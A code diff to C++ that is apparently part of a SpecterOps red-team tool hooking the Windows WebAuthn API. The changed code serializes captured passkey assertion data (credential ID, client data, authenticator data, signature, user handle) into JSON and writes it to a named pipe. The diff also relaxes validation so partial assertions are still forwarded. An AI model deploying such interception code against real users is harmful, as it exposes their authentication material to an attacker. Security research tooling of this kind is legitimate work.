@@ -128,25 +128,21 @@ namespace SpecterOps::Passkeys::WebAuthnHook
             const WEBAUTHN_CLIENT_DATA* clientData,
             const WEBAUTHN_ASSERTION* assertion)
         {
-            if (clientData == nullptr
-                || assertion == nullptr
-                || clientData->pbClientDataJSON == nullptr
-                || clientData->cbClientDataJSON == 0
-                || assertion->Credential.pbId == nullptr
-                || assertion->Credential.cbId == 0
-                || assertion->pbAuthenticatorData == nullptr
-                || assertion->cbAuthenticatorData == 0
-                || assertion->pbSignature == nullptr
-                || assertion->cbSignature == 0)
-            {
-                return {};
-            }
-
-            const std::string credentialId    = Base64UrlEncode(assertion->Credential.pbId, assertion->Credential.cbId);
-            const std::string clientDataJson  = Base64UrlEncode(clientData->pbClientDataJSON, clientData->cbClientDataJSON);
-            const std::string authenticatorData = Base64UrlEncode(assertion->pbAuthenticatorData, assertion->cbAuthenticatorData);
-            const std::string signature       = Base64UrlEncode(assertion->pbSignature, assertion->cbSignature);
-            const std::string userHandle      = Base64UrlEncode(assertion->pbUserId, assertion->cbUserId);
+            const std::string credentialId = (assertion != nullptr && assertion->Credential.pbId != nullptr && assertion->Credential.cbId > 0)
+                ? Base64UrlEncode(assertion->Credential.pbId, assertion->Credential.cbId)
+                : std::string{};
+            const std::string clientDataJson = (clientData != nullptr && clientData->pbClientDataJSON != nullptr && clientData->cbClientDataJSON > 0)
+                ? Base64UrlEncode(clientData->pbClientDataJSON, clientData->cbClientDataJSON)
+                : std::string{};
+            const std::string authenticatorData = (assertion != nullptr && assertion->pbAuthenticatorData != nullptr && assertion->cbAuthenticatorData > 0)
+                ? Base64UrlEncode(assertion->pbAuthenticatorData, assertion->cbAuthenticatorData)
+                : std::string{};
+            const std::string signature = (assertion != nullptr && assertion->pbSignature != nullptr && assertion->cbSignature > 0)
+                ? Base64UrlEncode(assertion->pbSignature, assertion->cbSignature)
+                : std::string{};
+            const std::string userHandle = (assertion != nullptr && assertion->pbUserId != nullptr && assertion->cbUserId > 0)
+                ? Base64UrlEncode(assertion->pbUserId, assertion->cbUserId)
+                : std::string{};
 
             std::string json;
             json.reserve(
@@ -169,7 +165,7 @@ namespace SpecterOps::Passkeys::WebAuthnHook
             json += signature;
             json += R"(","userHandle":)";
 
-            if (assertion->cbUserId == 0 || assertion->pbUserId == nullptr)
+            if (assertion == nullptr || assertion->cbUserId == 0 || assertion->pbUserId == nullptr)
             {
                 json += "null";
             }
@@ -212,6 +208,18 @@ namespace SpecterOps::Passkeys::WebAuthnHook
         }
     }
 
+    HANDLE OpenHookPipe()
+    {
+        return ::CreateFileW(
+            WebAuthnHookPipeName,
+            GENERIC_WRITE,
+            0,
+            nullptr,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            nullptr);
+    }
+
     bool WritePipeMessage(HANDLE pipe, std::string_view message)
     {
         DWORD bytesWritten = 0;
@@ -249,11 +257,6 @@ namespace SpecterOps::Passkeys::WebAuthnHook
         const WEBAUTHN_ASSERTION* assertion)
     {
         const std::string payload = SerializeAssertionResponse(clientData, assertion);
-        if (payload.empty())
-        {
-            return {};
-        }
-
         const std::string timestamp = IsoTimestampUtc();
 
         std::string msg;
